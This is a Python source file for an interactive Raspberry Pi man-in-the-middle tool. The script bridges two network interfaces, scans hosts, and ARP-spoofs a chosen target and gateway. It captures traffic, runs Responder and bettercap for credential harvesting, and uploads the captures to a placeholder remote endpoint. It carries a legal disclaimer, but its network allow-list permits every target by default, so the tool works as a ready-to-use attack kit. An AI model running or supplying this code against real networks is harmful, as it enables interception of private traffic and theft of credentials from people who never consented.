#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import logging
from datetime import datetime
import json
import netifaces
import requests
import readline

# ASCII Art
ASCII_ART = r"""
  __  __ ___ _____ __  __    ___ _   _ _  _______ ____  
 |  \/  |_ _|_   _|  \/  |  |_ _| \ | | |/ / ____|  _ \ 
 | |\/| || |  | | | |\/| |   | ||  \| | ' /|  _| | |_) |
 | |  | || |  | | | |  | |   | || |\  | . \| |___|  _ < 
 |_|  |_|___| |_| |_|  |_|  |___|_| \_|_|\_\_____|_| \_\
 
 Raspberry Pi MITM Network Auditing Tool
"""

# Configuration
CONFIG_FILE = "/etc/mitm_tool/config.json"
LOG_FILE = "/var/log/mitm_tool.log"
DATA_DIR = "/var/lib/mitm_tool/captures"
REMOTE_UPLOAD_URL = "https://your-remote-endpoint.com/api/upload"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class MITMTool:
    def __init__(self):
        self.load_config()
        self.check_safety()
        self.setup_environment()
        self.interfaces = {}
        self.targets = []
        self.capture_processes = {}
        
    def load_config(self):
        """Load configuration from file"""
        try:
            with open(CONFIG_FILE) as f:
                self.config = json.load(f)
            logger.info("Configuration loaded successfully")
        except (FileNotFoundError, json.JSONDecodeError):
            self.config = {
                "remote_upload": False,
                "auto_start": False,
                "allowed_networks": [],
                "legal_disclaimer_accepted": False
            }
            logger.warning("Using default configuration")

    def check_safety(self):
        """Display legal disclaimers and safety checks"""
        disclaimer = """
        WARNING: This tool is for authorized security auditing and penetration testing only.
        Unauthorized use is illegal and unethical. By using this tool, you agree that:
        
        1. You have explicit permission to test the network you're targeting
        2. You understand the legal implications of network monitoring
        3. You will not use this tool for malicious purposes
        
        The developers assume no liability for misuse of this software.
        """
        
        print(disclaimer)
        
        if not self.config.get("legal_disclaimer_accepted", False):
            response = input("Do you accept these terms? (yes/no): ").strip().lower()
            if response != "yes":
                print("Exiting...")
                sys.exit(0)
            
            self.config["legal_disclaimer_accepted"] = True
            self.save_config()

    def save_config(self):
        """Save configuration to file"""
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)

    def setup_environment(self):
        """Create necessary directories and check dependencies"""
        os.makedirs(DATA_DIR, exist_ok=True)
        
        # Check for required tools
        required_tools = [
            'arpspoof', 'dsniff', 'nmap', 'tcpdump', 
            'bettercap', 'responder', 'tailscale'
        ]
        
        missing_tools = []
        for tool in required_tools:
            if not self.check_tool_installed(tool):
                missing_tools.append(tool)
                
        if missing_tools:
            logger.error(f"Missing required tools: {', '.join(missing_tools)}")
            sys.exit(1)

    def check_tool_installed(self, tool):
        """Check if a command line tool is installed"""
        try:
            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    def detect_interfaces(self):
        """Detect available network interfaces"""
        self.interfaces = {}
        try:
            interfaces = netifaces.interfaces()
            
            for iface in interfaces:
                if iface.startswith('eth') or iface.startswith('en'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        ip_info = addrs[netifaces.AF_INET][0]
                        self.interfaces[iface] = {
                            'ip': ip_info.get('addr', ''),
                            'netmask': ip_info.get('netmask', ''),
                            'mac': addrs[netifaces.AF_LINK][0]['addr'] if netifaces.AF_LINK in addrs else ''
                        }
            
            logger.info(f"Detected interfaces: {json.dumps(self.interfaces, indent=2)}")
            return len(self.interfaces) >= 2  # Need at least two interfaces for bridging
            
        except Exception as e:
            logger.error(f"Error detecting interfaces: {str(e)}")
            return False

    def setup_bridge(self):
        """Bridge two Ethernet interfaces"""
        if len(self.interfaces) < 2:
            logger.error("Need at least two interfaces to create a bridge")
            return False
            
        iface1, iface2 = list(self.interfaces.keys())[:2]
        
        try:
            # Disable IP on interfaces
            subprocess.run(["sudo", "ifconfig", iface1, "0.0.0.0"], check=True)
            subprocess.run(["sudo", "ifconfig", iface2, "0.0.0.0"], check=True)
            
            # Create bridge
            subprocess.run(["sudo", "brctl", "addbr", "mitm-bridge"], check=True)
            subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface1], check=True)
            subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface2], check=True)
            
            # Bring up bridge
            subprocess.run(["sudo", "ifconfig", "mitm-bridge", "up"], check=True)
            
            logger.info(f"Successfully bridged {iface1} and {iface2} via mitm-bridge")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to create bridge: {str(e)}")
            return False

    def network_scan(self):
        """Perform network scan using nmap and arp-scan"""
        if not self.interfaces:
            logger.error("No interfaces detected")
            return
            
        interface = list(self.interfaces.keys())[0]
        
        try:
            # ARP scan for live hosts
            logger.info("Running ARP scan...")
            arp_scan = subprocess.run(
                ["sudo", "arp-scan", "--interface", interface, "--localnet"],
                capture_output=True, text=True
            )
            print(arp_scan.stdout)
            
            # Nmap scan for services
            logger.info("Running Nmap scan...")
            subnet = self.get_subnet(interface)
            if subnet:
                nmap_scan = subprocess.run(
                    ["sudo", "nmap", "-sV", "-O", subnet],
                    capture_output=True, text=True
                )
                print(nmap_scan.stdout)
                
        except Exception as e:
            logger.error(f"Scanning failed: {str(e)}")

    def get_subnet(self, interface):
        """Calculate subnet from interface IP and netmask"""
        if interface not in self.interfaces:
            return None
            
        ip = self.interfaces[interface]['ip']
        netmask = self.interfaces[interface]['netmask']
        
        if not ip or not netmask:
            return None
            
        # Simple subnet calculation (for /24 networks)
        if netmask == "255.255.255.0":
            return ".".join(ip.split(".")[:3]) + ".0/24"
        return None

    def arp_spoof(self, target_ip, gateway_ip):
        """Start ARP spoofing between target and gateway"""
        if not self.check_target_safety(target_ip):
            logger.error(f"Target {target_ip} is not in allowed networks")
            return
            
        try:
            # Enable IP forwarding
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            
            # Start arpspoof processes
            cmd1 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", target_ip, gateway_ip]
            cmd2 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", gateway_ip, target_ip]
            
            self.capture_processes['arpspoof1'] = subprocess.Popen(cmd1)
            self.capture_processes['arpspoof2'] = subprocess.Popen(cmd2)
            
            logger.info(f"ARP spoofing started between {target_ip} and {gateway_ip}")
            return True
            
        except Exception as e:
            logger.error(f"ARP spoofing failed: {str(e)}")
            return False

    def check_target_safety(self, target_ip):
        """Check if target is in allowed networks"""
        if not self.config.get("allowed_networks"):
            return True  # No restrictions configured
            
        for network in self.config.get("allowed_networks", []):
            if target_ip.startswith(network):
                return True
        return False

    def start_packet_capture(self, interface="mitm-bridge", filename=None):
        """Start packet capture with tcpdump"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{DATA_DIR}/capture_{timestamp}.pcap"
            
        try:
            cmd = [
                "sudo", "tcpdump", "-i", interface, 
                "-w", filename, "-s", "0", 
                "not port 22"  # Exclude SSH traffic
            ]
            
            self.capture_processes['tcpdump'] = subprocess.Popen(cmd)
            logger.info(f"Packet capture started on {interface}, saving to {filename}")
            return True
            
        except Exception as e:
            logger.error(f"Packet capture failed: {str(e)}")
            return False

    def start_responder(self, interface="mitm-bridge"):
        """Start Responder for credential harvesting"""
        try:
            cmd = [
                "sudo", "responder", "-I", interface,
                "-w", "-d", "--lm"
            ]
            
            self.capture_processes['responder'] = subprocess.Popen(cmd)
            logger.info(f"Responder started on {interface}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Responder: {str(e)}")
            return False

    def start_bettercap(self, script_path=None):
        """Start bettercap with optional script"""
        try:
            cmd = ["sudo", "bettercap", "-iface", "mitm-bridge"]
            
            if script_path and os.path.exists(script_path):
                cmd.extend(["-eval", f"load {script_path}"])
                
            self.capture_processes['bettercap'] = subprocess.Popen(cmd)
            logger.info("Bettercap started")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start bettercap: {str(e)}")
            return False

    def stop_all_attacks(self):
        """Stop all running attack processes"""
        for name, process in self.capture_processes.items():
            try:
                process.terminate()
                process.wait(timeout=5)
                logger.info(f"Stopped {name}")
            except:
                try:
                    process.kill()
                    logger.warning(f"Force stopped {name}")
                except:
                    logger.error(f"Failed to stop {name}")
                    
        self.capture_processes = {}
        
        # Disable IP forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
        logger.info("All attacks stopped")

    def upload_data(self):
        """Upload captured data to remote endpoint"""
        if not self.config.get("remote_upload", False):
            logger.info("Remote upload disabled in config")
            return False
            
        try:
            # Find all capture files
            files = []
            for f in os.listdir(DATA_DIR):
                if f.endswith(".pcap") or f.endswith(".log"):
                    files.append(os.path.join(DATA_DIR, f))
                    
            if not files:
                logger.info("No capture files to upload")
                return False
                
            # Upload each file
            for file_path in files:
                with open(file_path, 'rb') as f:
                    files = {'file': (os.path.basename(file_path), f)}
                    response = requests.post(
                        REMOTE_UPLOAD_URL,
                        files=files,
                        headers={'Authorization': f'Bearer {self.config.get("api_key", "")}'}
                    )
                    
                    if response.status_code == 200:
                        logger.info(f"Successfully uploaded {file_path}")
                        os.remove(file_path)  # Delete after successful upload
                    else:
                        logger.error(f"Upload failed for {file_path}: {response.text}")
                        
            return True
            
        except Exception as e:
            logger.error(f"Upload failed: {str(e)}")
            return False

    def show_main_menu(self):
        """Display the main menu with ASCII art"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(ASCII_ART)
        print("\n" + "="*50)
        print(" MAIN MENU".center(50))
        print("="*50)
        print("\n1. Network Scanning Tools")
        print("2. MITM Attack Tools")
        print("3. Packet Capture & Analysis")
        print("4. Credential Harvesting")
        print("5. System Configuration")
        print("6. Stop All Attacks")
        print("7. Exit")
        
    def interactive_menu(self):
        """Main interactive menu"""
        while True:
            self.show_main_menu()
            choice = input("\nSelect an option (1-7): ").strip()
            
            try:
                if choice == "1":
                    self.network_scan()
                    input("\nPress Enter to continue...")
                elif choice == "2":
                    target = input("Enter target IP: ").strip()
                    gateway = input("Enter gateway IP: ").strip()
                    self.arp_spoof(target, gateway)
                    input("\nPress Enter to continue...")
                elif choice == "3":
                    self.start_packet_capture()
                    input("\nPress Enter to continue...")
                elif choice == "4":
                    self.start_responder()
                    input("\nPress Enter to continue...")
                elif choice == "5":
                    print("\nConfiguration options:")
                    print("1. Toggle remote upload (current: {})".format(
                        "Enabled" if self.config.get("remote_upload") else "Disabled"))
                    print("2. Add allowed network")
                    config_choice = input("Select option: ").strip()
                    input("\nPress Enter to continue...")
                elif choice == "6":
                    self.stop_all_attacks()
                    input("\nPress Enter to continue...")
                elif choice == "7":
                    self.stop_all_attacks()
                    print("\nGoodbye!")
                    break
                else:
                    print("Invalid choice")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("\nOperation cancelled")
                time.sleep(1)
            except Exception as e:
                logger.error(f"Error: {str(e)}")
                time.sleep(2)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("This script must be run as root")
        sys.exit(1)
        
    tool = MITMTool()
    
    # Detect interfaces and setup bridge
    if tool.detect_interfaces():
        if tool.setup_bridge():
            print("\nNetwork bridge setup successfully")
            time.sleep(2)
        else:
            print("\nFailed to setup bridge")
            time.sleep(2)
    else:
        print("\nNot enough interfaces detected")
        time.sleep(2)
    
    # Start interactive menu
    tool.interactive_menu()
